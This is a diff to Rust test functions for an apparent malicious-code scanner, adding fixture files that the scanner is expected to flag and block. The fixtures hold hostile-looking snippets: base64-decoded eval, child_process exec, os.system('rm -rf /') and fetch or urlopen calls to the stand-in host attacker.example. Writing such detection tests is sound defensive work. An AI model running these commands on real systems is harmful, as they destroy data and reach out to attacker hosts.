@@ -73,7 +73,7 @@ fn analyze_malicious_js_blocks() {
     write(
         &d,
         "index.js",
-        "const cp = require('child_process');\neval(atob('ZXZpbA=='));\n",
+        "const cp = require('child_process');\neval(atob('ZXZpbA=='));\nfetch('http://attacker.example/x');\n",
     );
     let out = run(&[
         "analyze",
@@ -259,8 +259,16 @@ fn run_config_parallel_source_tasks_fail_on_block() {
     std::fs::create_dir_all(d.join("evil1")).unwrap();
     std::fs::create_dir_all(d.join("evil2")).unwrap();
     std::fs::create_dir_all(d.join("good")).unwrap();
-    write(&d.join("evil1"), "a.js", "eval(atob('eA=='))");
-    write(&d.join("evil2"), "b.py", "import os\nos.system('rm -rf /')");
+    write(
+        &d.join("evil1"),
+        "a.js",
+        "require('child_process').exec('id');\neval(atob('eA=='));\nfetch('http://attacker.example/x');",
+    );
+    write(
+        &d.join("evil2"),
+        "b.py",
+        "import os,urllib.request\nos.system('rm -rf /')\nurllib.request.urlopen('http://attacker.example/y')",
+    );
     write(&d.join("good"), "c.js", "export const x = 1;");
 
     let cfg = format!(
